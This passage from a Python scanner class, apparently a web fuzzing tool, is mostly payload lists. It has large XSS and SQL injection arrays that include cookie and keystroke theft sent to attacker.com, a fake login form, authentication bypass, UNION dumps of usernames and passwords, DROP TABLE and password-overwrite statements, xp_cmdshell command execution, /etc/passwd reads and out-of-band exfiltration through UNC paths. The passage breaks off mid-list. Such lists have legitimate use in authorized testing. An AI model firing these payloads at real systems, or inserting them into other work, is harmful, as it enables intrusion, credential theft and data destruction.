            "stage-config.php", "stage-config.json", "stage-config.yaml",
            "preprod-config.php", "preprod-config.json", "preprod-config.yaml"
        ]
        
        self.common_params = [

            "id", "ID", "Id", "i", "d", "uid", "userid", "userId", "user_id",
            "user", "username", "userName", "user_name", "usr", "usrname",
            "name", "firstname", "firstName", "first_name", "lastname",
            "lastName", "last_name", "fullname", "fullName", "full_name",
            

            "password", "pass", "passwd", "pwd", "secret", "token", "auth",
            "auth_token", "access_token", "accessToken", "access_token",
            "refresh_token", "refreshToken", "refresh_token", "session",
            "session_id", "sessionId", "sessionid", "sid", "SID",
            "csrf", "csrf_token", "csrfToken", "csrf_token", "csrfmiddlewaretoken",
            "authenticity_token", "_token", "token", "jwt", "JWT", "bearer",
            

            "email", "Email", "EMAIL", "mail", "e-mail", "e_mail",
            "contact", "contact_email", "contactEmail", "contact_email",
            "address", "address1", "address2", "city", "state", "zip",
            "zipcode", "postal", "postal_code", "country", "phone",
            "telephone", "mobile", "cell", "fax",
            

            "q", "query", "search", "s", "find", "filter", "where",
            "keyword", "keywords", "term", "terms", "text", "txt",
            "lookup", "look", "seek", "scan", "find_all", "findAll",
            

            "sort", "order", "orderby", "order_by", "sortby", "sort_by",
            "direction", "dir", "asc", "desc", "sort_order", "sortOrder",
            

            "page", "p", "pg", "pagenumber", "pageNumber", "page_number",
            "offset", "start", "begin", "limit", "max", "count", "size",
            "per_page", "perPage", "per_page", "items_per_page",
            "itemsPerPage", "items_per_page", "records", "records_per_page",
            

            "date", "time", "datetime", "dateTime", "date_time",
            "year", "month", "day", "hour", "minute", "second",
            "from", "to", "start_date", "end_date", "startDate",
            "endDate", "start_date", "end_date", "created", "created_at",
            "updated", "updated_at", "modified", "modified_at",
            

            "file", "filename", "fileName", "file_name", "path", "filepath",
            "filePath", "file_path", "url", "URL", "uri", "URI", "link",
            "image", "img", "picture", "photo", "document", "doc",
            "attachment", "attach", "upload", "download", "save", "load",
            

            "title", "Title", "TITLE", "subject", "Subject", "SUBJECT",
            "content", "Content", "CONTENT", "body", "Body", "BODY",
            "text", "Text", "TEXT", "message", "Message", "MESSAGE",
            "comment", "Comment", "COMMENT", "description", "Description",
            "DESCRIPTION", "summary", "Summary", "SUMMARY", "abstract",
            

            "category", "Category", "CATEGORY", "cat", "Cat", "CAT",
            "tag", "Tag", "TAG", "tags", "Tags", "TAGS", "label",
            "Label", "LABEL", "type", "Type", "TYPE", "kind", "Kind",
            "KIND", "group", "Group", "GROUP",
            

            "number", "Number", "NUMBER", "num", "Num", "NUM",
            "amount", "Amount", "AMOUNT", "quantity", "Quantity",
            "QUANTITY", "total", "Total", "TOTAL", "sum", "Sum", "SUM",
            "price", "Price", "PRICE", "cost", "Cost", "COST",
            "value", "Value", "VALUE", "score", "Score", "SCORE",
            "rating", "Rating", "RATING", "rank", "Rank", "RANK",
            

            "status", "Status", "STATUS", "state", "State", "STATE",
            "active", "Active", "ACTIVE", "enabled", "Enabled", "ENABLED",
            "disabled", "Disabled", "DISABLED", "visible", "Visible",
            "VISIBLE", "hidden", "Hidden", "HIDDEN", "deleted", "Deleted",
            "DELETED", "approved", "Approved", "APPROVED",
            

            "api_key", "apiKey", "api_key", "apikey", "APIKEY", "key",
            "Key", "KEY", "secret", "Secret", "SECRET", "app_id",
            "appId", "app_id", "appid", "APPID", "client_id", "clientId",
            "client_id", "clientid", "CLIENTID", "client_secret",
            "clientSecret", "client_secret", "clientsecret", "CLIENTSECRET",
            

            "redirect", "Redirect", "REDIRECT", "return", "Return", "RETURN",
            "next", "Next", "NEXT", "previous", "Previous", "PREVIOUS",
            "back", "Back", "BACK", "forward", "Forward", "FORWARD",
            "goto", "Goto", "GOTO", "go", "Go", "GO",
            

            "action", "Action", "ACTION", "method", "Method", "METHOD",
            "submit", "Submit", "SUBMIT", "save", "Save", "SAVE",
            "update", "Update", "UPDATE", "delete", "Delete", "DELETE",
            "create", "Create", "CREATE", "edit", "Edit", "EDIT",
            

            "view", "View", "VIEW", "show", "Show", "SHOW", "hide",
            "Hide", "HIDE", "display", "Display", "DISPLAY", "mode",
            "Mode", "MODE", "format", "Format", "FORMAT", "style",
            "Style", "STYLE", "theme", "Theme", "THEME",
            

            "lang", "Lang", "LANG", "language", "Language", "LANGUAGE",
            "locale", "Locale", "LOCALE", "country", "Country", "COUNTRY",
            "region", "Region", "REGION", "currency", "Currency", "CURRENCY",
            

            "captcha", "Captcha", "CAPTCHA", "code", "Code", "CODE",
            "verify", "Verify", "VERIFY", "confirm", "Confirm", "CONFIRM",
            "validate", "Validate", "VALIDATE", "check", "Check", "CHECK",
            "test", "Test", "TEST", "debug", "Debug", "DEBUG",
            

            "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "CFID",
            "CFTOKEN", "sessionid", "sessionId", "session_id", "sid",
            "SID", "cookie", "Cookie", "COOKIE",
            

            "p", "page_id", "pageId", "page_id", "post", "post_id",
            "postId", "post_id", "attachment_id", "attachmentId",
            "attachment_id", "cat", "category_name", "categoryName",
            "category_name", "tag_id", "tagId", "tag_id", "author",
            "author_name", "authorName", "author_name", "year",
            "monthnum", "day", "hour", "minute", "second",
            

            "option", "view", "layout", "task", "Itemid", "id",
            "cid", "catid", "lang", "tmpl", "format", "limitstart",
            

            "q", "destination", "op", "form_id", "form_build_id",
            "form_token", "edit", "delete", "revision",
            

            "product", "product_id", "productId", "product_id",
            "product_name", "productName", "product_name",
            "sku", "SKU", "stock", "inventory", "cart", "Cart", "CART",
            "cart_id", "cartId", "cart_id", "order", "order_id",
            "orderId", "order_id", "invoice", "invoice_id", "invoiceId",
            "invoice_id", "shipping", "Shipping", "SHIPPING",
            "billing", "Billing", "BILLING", "payment", "Payment",
            "PAYMENT", "tax", "Tax", "TAX", "discount", "Discount",
            "DISCOUNT", "coupon", "Coupon", "COUPON", "promo", "Promo",
            "PROMO", "voucher", "Voucher", "VOUCHER",
            

            "like", "Like", "LIKE", "share", "Share", "SHARE",
            "follow", "Follow", "FOLLOW", "friend", "Friend", "FRIEND",
            "message", "Message", "MESSAGE", "chat", "Chat", "CHAT",
            "comment", "Comment", "COMMENT", "review", "Review", "REVIEW",
            "rating", "Rating", "RATING", "vote", "Vote", "VOTE",
            "feedback", "Feedback", "FEEDBACK", "report", "Report",
            "REPORT", "flag", "Flag", "FLAG",
            

            "media", "Media", "MEDIA", "video", "Video", "VIDEO",
            "audio", "Audio", "AUDIO", "image", "Image", "IMAGE",
            "file", "File", "FILE", "document", "Document", "DOCUMENT",
            "attachment", "Attachment", "ATTACHMENT", "upload", "Upload",
            "UPLOAD", "download", "Download", "DOWNLOAD",
            

            "admin", "Admin", "ADMIN", "root", "Root", "ROOT",
            "superuser", "Superuser", "SUPERUSER", "system", "System",
            "SYSTEM", "config", "Config", "CONFIG", "setting", "Setting",
            "SETTING", "option", "Option", "OPTION", "parameter",
            "Parameter", "PARAMETER", "variable", "Variable", "VARIABLE",
            

            "table", "Table", "TABLE", "column", "Column", "COLUMN",
            "field", "Field", "FIELD", "record", "Record", "RECORD",
            "query", "Query", "QUERY", "sql", "SQL", "select", "Select",
            "SELECT", "insert", "Insert", "INSERT", "update", "Update",
            "UPDATE", "delete", "Delete", "DELETE", "where", "Where",
            "WHERE", "join", "Join", "JOIN", "group", "Group", "GROUP",
            "order", "Order", "ORDER", "limit", "Limit", "LIMIT",
            

            "callback", "Callback", "CALLBACK", "jsonp", "JSONP",
            "jsoncallback", "jsonCallback", "json_callback", "format",
            "Format", "FORMAT", "output", "Output", "OUTPUT", "pretty",
            "Pretty", "PRETTY", "fields", "Fields", "FIELDS", "expand",
            "Expand", "EXPAND", "embed", "Embed", "EMBED", "include",
            "Include", "INCLUDE", "exclude", "Exclude", "EXCLUDE",
            

            "track", "Track", "TRACK", "analytics", "Analytics",
            "ANALYTICS", "metric", "Metric", "METRIC", "stat", "Stat",
            "STAT", "report", "Report", "REPORT", "log", "Log", "LOG",
            "event", "Event", "EVENT", "action", "Action", "ACTION",
            

            "custom", "Custom", "CUSTOM", "user_defined", "userDefined",
            "user_defined", "app_specific", "appSpecific", "app_specific",
            "business", "Business", "BUSINESS", "domain", "Domain",
            "DOMAIN", "project", "Project", "PROJECT", "module",
            "Module", "MODULE", "component", "Component", "COMPONENT",
            "feature", "Feature", "FEATURE", "function", "Function",
            "FUNCTION",
            

            "old", "Old", "OLD", "legacy", "Legacy", "LEGACY",
            "deprecated", "Deprecated", "DEPRECATED", "previous",
            "Previous", "PREVIOUS", "original", "Original", "ORIGINAL",
            

            "test", "Test", "TEST", "testing", "Testing", "TESTING",
            "debug", "Debug", "DEBUG", "development", "Development",
            "DEVELOPMENT", "dev", "Dev", "DEV", "staging", "Staging",
            "STAGING", "qa", "QA", "quality", "Quality", "QUALITY",
            

            "version", "Version", "VERSION", "release", "Release",
            "RELEASE", "build", "Build", "BUILD", "revision", "Revision",
            "REVISION", "commit", "Commit", "COMMIT", "branch", "Branch",
            "BRANCH", "tag", "Tag", "TAG",
            

            "url", "Url", "URL", "uri", "Uri", "URI", "path", "Path",
            "PATH", "route", "Route", "ROUTE", "endpoint", "Endpoint",
            "ENDPOINT", "host", "Host", "HOST", "domain", "Domain",
            "DOMAIN", "port", "Port", "PORT", "ip", "IP", "address",
            "Address", "ADDRESS", "protocol", "Protocol", "PROTOCOL",
            

            "xss", "XSS", "sql", "SQL", "injection", "Injection",
            "INJECTION", "payload", "Payload", "PAYLOAD", "exploit",
            "Exploit", "EXPLOIT", "vulnerability", "Vulnerability",
            "VULNERABILITY", "attack", "Attack", "ATTACK", "hack",
            "Hack", "HACK", "bypass", "Bypass", "BYPASS", "encode",
            "Encode", "ENCODE", "decode", "Decode", "DECODE",
            

            "'", "\"", "`", "\\", "/", "|", "&", ";", ":", "<", ">",
            "=", "+", "-", "*", "%", "#", "@", "!", "?", ".", ",",
            "(", ")", "[", "]", "{", "}", "$", "^", "~"
        ]

        
        self.xss_payloads = [

            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(window.location)</script>",
            

            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=x onerror=alert(document.domain)>",
            "<img src=x onerror=alert(window.location)>",
            "<img src=x oneonerrorrror=alert('XSS')>",
            "<img src=x onerror=javascript:alert('XSS')>",
            "<img src=x onerror=alert('XSS')//",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            

            "<svg onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<svg onload=alert(document.domain)>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><script>alert(document.domain)</script></svg>",
            "<svg><script>alert(window.location)</script></svg>",
            

            "<body onload=alert('XSS')>",
            "<body onload=alert(document.domain)>",
            "<body onload=alert(window.location)>",
            "<body onpageshow=alert('XSS')>",
            "<body onfocus=alert('XSS')>",
            

            "<iframe onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS');\">",
            "<iframe src=data:text/html,<script>alert('XSS')</script>>",
            "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
            

            "javascript:alert('XSS')",
            "javascript:alert(document.domain)",
            "javascript:alert(window.location)",
            "javascript:alert(document.cookie)",
            "Javas&#99;ript:alert('XSS')",
            "javascript&#58;alert('XSS')",
            "javascript&#0058;alert('XSS')",
            "javascript&#x3a;alert('XSS')",
            

            "onmouseover=alert('XSS')",
            "onmouseenter=alert('XSS')",
            "onmouseleave=alert('XSS')",
            "onmousedown=alert('XSS')",
            "onmouseup=alert('XSS')",
            "onclick=alert('XSS')",
            "ondblclick=alert('XSS')",
            "oncontextmenu=alert('XSS')",
            "onfocus=alert('XSS')",
            "onblur=alert('XSS')",
            "onkeydown=alert('XSS')",
            "onkeypress=alert('XSS')",
            "onkeyup=alert('XSS')",
            "onsubmit=alert('XSS')",
            "onreset=alert('XSS')",
            "onselect=alert('XSS')",
            "onchange=alert('XSS')",
            "onload=alert('XSS')",
            "onunload=alert('XSS')",
            "onerror=alert('XSS')",
            "onpageshow=alert('XSS')",
            "onpagehide=alert('XSS')",
            

            "onauxclick=alert('XSS')",
            "oncopy=alert('XSS')",
            "oncut=alert('XSS')",
            "onpaste=alert('XSS')",
            "ondrag=alert('XSS')",
            "ondragend=alert('XSS')",
            "ondragenter=alert('XSS')",
            "ondragleave=alert('XSS')",
            "ondragover=alert('XSS')",
            "ondragstart=alert('XSS')",
            "ondrop=alert('XSS')",
            "onwheel=alert('XSS')",
            "onscroll=alert('XSS')",
            "onresize=alert('XSS')",
            "ontoggle=alert('XSS')",
            

            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3cscript%3ealert('XSS')%3c/script%3e",
            "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;alert('XSS')&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            

            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<scriscriptpt>alert('XSS')</scriscriptpt>",
            "<SCRIPT SRC=//xss.rocks/xss.js></SCRIPT>",
            "<IMG SRC=`javascript:alert(\"XSS\")`>",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=javascript:alert('XSS');>",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<IMG SRC='javascript:alert(\"XSS\")'>",
            

            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"><img src=x onerror=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "</script><script>alert(1)</script>",
            "</script><script>alert(1)</script><script>",
            

            "#<img src=x onerror=alert(1)>",
            "#<script>alert(1)</script>",
            "?test=#<img src=x onerror=alert(1)>",
            "?test=#<script>alert(1)</script>",
            

            "${alert('XSS')}",
            "#{alert('XSS')}",
            "{{alert('XSS')}}",
            "[[alert('XSS')]]",
            "<?=alert('XSS')?>",
            "<%= alert('XSS') %>",
            "{% alert('XSS') %}",
            "{{=alert('XSS')}}",
            

            "<script>alert`1`</script>",
            "<script>alert.call(null,1)</script>",
            "<script>alert.apply(null,[1])</script>",
            "<script>(alert)(1)</script>",
            "<script>[1].map(alert)</script>",
            "<script>top[\"al\"+\"ert\"](1)</script>",
            "<script>self[`al`+`ert`](1)</script>",
            "<script>globalThis[`al`+`ert`](1)</script>",
            "<script>window[`al`+`ert`](1)</script>",
            "<script>parent[`al`+`ert`](1)</script>",
            "<script>frames[`al`+`ert`](1)</script>",
            

            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie;</script>",
            "<script>fetch('http://attacker.com/steal', {method:'POST',body:document.cookie})</script>",
            "<img src=x onerror=\"fetch('http://attacker.com/steal', {method:'POST',body:document.cookie})\">",
            

            "<script>document.onkeypress=function(e){fetch('http://attacker.com/keylogger?key='+e.key)}</script>",
            "<script>document.addEventListener('keypress',e=>fetch('http://attacker.com/keylogger?key='+e.key))</script>",
            

            "<script>window.location='http://attacker.com'</script>",
            "<script>document.location='http://attacker.com'</script>",
            "<script>top.location='http://attacker.com'</script>",
            "<script>self.location='http://attacker.com'</script>",
            "<script>parent.location='http://attacker.com'</script>",
            "<script>window.location.href='http://attacker.com'</script>",
            

            "<script>document.body.innerHTML='<h1>Please login</h1><form action=http://attacker.com/steal><input name=username><input name=password type=password><input type=submit></form>'</script>",
            

            "<script>document.body.style.opacity=0;document.body.onclick=function(){alert('XSS')}</script>",
            

            "<script>var ws=new WebSocket('ws://attacker.com');ws.onopen=function(){ws.send(document.cookie)}</script>",
            

            "<script>navigator.sendBeacon('http://attacker.com/beacon', document.cookie)</script>",
            

            "<form><button formaction=javascript:alert(1)>X</button>",
            "<form><input type=image src=1 onerror=alert(1)>",
            "<form><button onclick=alert(1)>X</button>",
            

            "<input onfocus=alert(1) autofocus>",
            "<input onblur=alert(1) autofocus><input autofocus>",
            "<input onfocus=alert(1)></input>",
            

            "<details ontoggle=alert(1) open>",
            "<details open ontoggle=alert(1)>",
            

            "<marquee onstart=alert(1)>",
            "<marquee loop=1 width=0 onfinish=alert(1)>",
            

            "<audio src onerror=alert(1)>",
            "<video src onerror=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio><source onerror=alert(1)>",
            

            "<object data=javascript:alert(1)>",
            "<object data=\"data:text/html,<script>alert(1)</script>\">",
            

            "<embed src=javascript:alert(1)>",
            "<embed src=\"data:text/html,<script>alert(1)</script>\">",
            

            "<applet code=javascript:alert(1)>",
            "<applet code=\"javascript:alert(1)\">",
            

            "<img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+\">",
            

            "<style>@import 'javascript:alert(\"XSS\")';</style>",
            "<style>li { list-style-image: url(\"javascript:alert('XSS')\"); }</style>",
            "<link rel=stylesheet href=javascript:alert(1)>",
            

            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
            "<meta charset=\"x-mac-farsi\">\"><script>alert(1)</script>",
            

            "<iframe sandbox=\"allow-scripts\" src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
            

            "<svg><script>alert(1)</script></svg>",
            "<svg><script href=\"data:text/javascript,alert(1)\"/>",
            "<svg><script xlink:href=\"data:text/javascript,alert(1)\"/>",
            

            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
            

            "<html xmlns:xlink><script xlink:href=\"data:text/javascript,alert(1)\"/>",
            

            "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-"
        ]
        
        self.sql_payloads = [

            "'",
            "''",
            "`",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 1=1/*",
            

            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT 1,2,3,4,5,6,7--",
            "' UNION SELECT 1,2,3,4,5,6,7,8--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            

            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT @@version, NULL--",
            "' UNION SELECT NULL, @@version--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS int)--",
            

            "' UNION SELECT database()--",
            "' UNION SELECT schema()--",
            "' UNION SELECT DATABASE(), NULL--",
            

            "' UNION SELECT user()--",
            "' UNION SELECT current_user()--",
            "' UNION SELECT session_user()--",
            "' UNION SELECT system_user()--",
            

            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT table_name, NULL FROM information_schema.tables--",
            "' UNION SELECT NULL, table_name FROM information_schema.tables--",
            

            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
            

            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT username, password, email FROM users--",
            "' UNION SELECT concat(username, ':', password) FROM users--",
            "' UNION SELECT group_concat(username, ':', password) FROM users--",
            

            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING((SELECT @@version),1,1)='M'--",
            "' AND ASCII(SUBSTRING((SELECT @@version),1,1))=77--",
            "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
            

            "' OR SLEEP(5)--",
            "' OR BENCHMARK(10000000,MD5('test'))--",
            "' OR pg_sleep(5)--",
            "' OR WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'); WAITFOR DELAY '00:00:05'--",
            

            "'; DROP TABLE users; --",
            "'; DELETE FROM users; --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
            

            "' AND GTID_SUBSET(@@version,0)--",
            "' AND EXTRACTVALUE(0,CONCAT(0x5c,@@version))--",
            "' AND UPDATEXML(1,CONCAT(0x5c,@@version),1)--",
            "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
            

            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'#",
            "') OR ('1'='1'/*",
            

            "test' OR '1'='1",
            "test' UNION SELECT 'injected'--",
            "test'); INSERT INTO logs (message) VALUES ('injected'); --",
            

            "' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\test.txt')--",
            "'; SELECT LOAD_FILE('\\\\attacker.com\\share\\test.txt')--",
            "' UNION SELECT @@version INTO OUTFILE '/tmp/version.txt'--",
            "'; SELECT @@version INTO OUTFILE '/tmp/version.txt'--",
            

            "' FOR XML PATH('')--",
            "'; SELECT * FROM users FOR XML AUTO--",
            

            "' FOR JSON PATH--",
            "'; SELECT * FROM users FOR JSON AUTO--",
            

            "'/**/OR/**/'1'='1",
            "'%09OR%09'1'='1",
            "'%0AOR%0A'1'='1",
            "'%0COR%0C'1'='1",
            "'%0DOR%0D'1'='1",
            "'%20OR%20'1'='1",
            

            "' OR '1'='1' -- -",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "' OR '1'='1'/**/",
            "' OR '1'='1'%00",
            "' OR '1'='1'%23",
            "' OR '1'='1'%2D%2D",
            

            "\\' OR \\'1\\'=\\'1",
            "\" OR \"1\"=\"1",
            "` OR `1`=`1",
            "' OR '1'='1",
            

            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'#",
            "') OR ('1'='1'/*",
            "\") OR (\"1\"=\"1",
            "\") OR (\"1\"=\"1\"--",
            

            "%27%20OR%20%271%27%3D%271",
            "%27%09OR%09%271%27%3D%271",
            "%27%0AOR%0A%271%27%3D%271",
            "%27%0COR%0C%271%27%3D%271",
            "%27%0DOR%0D%271%27%3D%271",
            

            "%2527%2520OR%2520%25271%2527%253D%25271",
            "%2527%2509OR%2509%25271%2527%253D%25271",
            

            "%u0027%u0020OR%u0020%u00271%u0027%u003D%u00271",
            "%uff07%uff20OR%uff20%uff071%uff07%uff1d%uff071",
            

            "' oR '1'='1",
            "' Or '1'='1",
            "' OR '1'='1",
            "' or '1'='1",
            

            "' OR '1'='1' -- ",
            "' OR '1'='1' #",
            "' OR '1'='1' /*!*/",
            "' OR '1'='1' /*!50000*/",
            "' OR '1'='1' /*!50001*/",
            

            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1'; --",
            "'); DROP TABLE users; --",
            

            "' OR '1'='1' --",
            "'; SELECT * FROM users --",
            "'); DROP TABLE users --",
            "' OR '1'='1' ;--",
            "' OR '1'='1' ; EXEC xp_cmdshell('dir') --",
            

            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL FROM dual --",
            "' OR '1'='1' AND 1= (SELECT 1 FROM dual) --",
            

            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' ;--",
            "' OR '1'='1' UNION SELECT sql FROM sqlite_master --",
            

            "' || '1'=='1",
            "' && '1'=='1",
            "' || 1==1",
            "' && 1==1",
            "' || true",
            "' && true",
            "' || $where: '1'=='1'",
            "' && $where: '1'=='1'",
            

            "' OR '1'='1' ORDER BY 1--",
            "' OR '1'='1' ORDER BY 2--",
            "' OR '1'='1' ORDER BY 3--",
            "' OR '1'='1' ORDER BY 4--",
            "' OR '1'='1' ORDER BY 5--",
            "' OR '1'='1' ORDER BY 6--",
            "' OR '1'='1' ORDER BY 7--",
            "' OR '1'='1' ORDER BY 8--",
            "' OR '1'='1' ORDER BY 9--",
            "' OR '1'='1' ORDER BY 10--",
            

            "' OR '1'='1' GROUP BY 1--",
            "' OR '1'='1' GROUP BY 1,2--",
            "' OR '1'='1' GROUP BY 1,2,3--",
            

            "' OR '1'='1' HAVING 1=1--",
            "' OR '1'='1' HAVING COUNT(*)>0--",
            

            "' OR '1'='1' LIMIT 1--",
            "' OR '1'='1' LIMIT 1 OFFSET 0--",
            

            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
            "'; EXEC xp_cmdshell('dir C:\\') --",
            "'; EXEC xp_cmdshell('ipconfig') --",
            "'; EXEC xp_cmdshell('whoami') --",
            

            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "' UNION SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini')--",
            "'; SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd' --",
            

            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName', 'ComputerName' --",
            

            "'; EXEC xp_dirtree '\\\\attacker.com\\share' --",
            "'; EXEC master..xp_subdirs '\\\\attacker.com\\share' --",
            

            "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test.txt')) --",
            

            "'/**/OR/**/'1'/**/='1",
            "'%0bOR%0b'1'%0b='1",
            "'%0cOR%0c'1'%0c='1",
            "'%0dOR%0d'1'%0d='1",
            "'%a0OR%a0'1'%a0='1",
            

            "0x27204f52202731273d2731",
            "0x2720756e696f6e2073656c6563742031",
            

            "b'111000010010011101000000010011110101001000100000001001110011000100100111001111010010011100110001'",
            

            "' OR '1'='1' COLLATE Latin1_General_CS_AS--",
            "' OR '1'='1' COLLATE SQL_Latin1_General_CP1_CS_AS--",
            

            "' OR CHAR(49)=CHAR(49)--",
            "' OR ASCII('a')=97--",
            "' OR LENGTH('test')=4--",
            "' OR SUBSTRING('test',1,1)='t'--",
            

            "' OR 1+1=2--",
            "' OR 2*2=4--",
            "' OR 10/2=5--",
            "' OR 5-3=2--",
            "' OR POW(2,3)=8--",
            "' OR SQRT(16)=4--",
            

            "' OR 1&1=1--",
            "' OR 1|1=1--",
            "' OR 1^0=1--",
            "' OR ~0=-1--",
            

            "' OR CONCAT('a','b')='ab'--",
            "' OR 'ab' LIKE 'a%'--",
            "' OR 'test' REGEXP '^t'--",
            "' OR 'test' RLIKE '^t'--",
            

            "' OR NOW()=NOW()--",
            "' OR CURDATE()=CURDATE()--",
            "' OR CURTIME()=CURTIME()--",
            "' OR YEAR(NOW())=YEAR(NOW())--",
            

            "' OR @@version=@@version--",
            "' OR @@hostname=@@hostname--",
            "' OR @@datadir=@@datadir--",
            "' OR @@basedir=@@basedir--",
            

            "' OR @var:=1--",
            "' OR @var='test'--",
            "' OR (@var:='test')='test'--",
            

            "' OR ?=?--",
            "' OR :var=:var--",
            "' OR @var=@var--",
            

            "' OR JSON_VALID('{}')=1--",
            "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1--",
            "' OR JSON_SEARCH('[\"a\",\"b\"]','one','a') IS NOT NULL--",
            

            "' OR ExtractValue('<a>test</a>','/a')='test'--",
            "' OR UpdateXML('<a>test</a>','/a','<a>hacked</a>') IS NOT NULL--",
            

            "' OR ST_GeometryFromText('POINT(1 1)') IS NOT NULL--",
            "' OR ST_Contains(ST_GeometryFromText('POLYGON((0 0,10 0,10 10,0 10,0 0))'), ST_GeometryFromText('POINT(5 5)'))=1--",
            

            "' OR MATCH(column) AGAINST('test')--",
            "' OR MATCH(column) AGAINST('test' IN BOOLEAN MODE)--",
            

            "' OR PARTITION BY 1--",
            "' OR OVER(PARTITION BY 1)--",
            

            "' OR ROW_NUMBER() OVER(ORDER BY 1)=1--",
            "' OR RANK() OVER(ORDER BY 1)=1--",
            "' OR DENSE_RANK() OVER(ORDER BY 1)=1--",
            

            "'; WITH cte AS (SELECT 1 as num) SELECT * FROM cte --",
            "'; WITH RECURSIVE cte(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM cte WHERE n<10) SELECT * FROM cte --",
            

            "'; SELECT * FROM (SELECT 1 as col1, 2 as col2) src PIVOT(MAX(col2) FOR col1 IN ([1])) pvt --",
            

            "'; MERGE INTO target USING source ON (1=1) WHEN MATCHED THEN UPDATE SET target.col=source.col --",
            

            "'; SELECT LEVEL FROM dual CONNECT BY LEVEL <= 10 --",
            "'; SELECT SYS_CONNECT_BY_PATH(column, '/') FROM table START WITH parent_id IS NULL CONNECT BY PRIOR id = parent_id --",
            

            "'; SELECT * FROM table AS OF TIMESTAMP SYSTIMESTAMP - INTERVAL '1' HOUR --",
            "'; SELECT * FROM table VERSIONS BETWEEN TIMESTAMP SYSTIMESTAMP - INTERVAL '1' HOUR AND SYSTIMESTAMP --",
            

            "'; REFRESH MATERIALIZED VIEW view_name --",
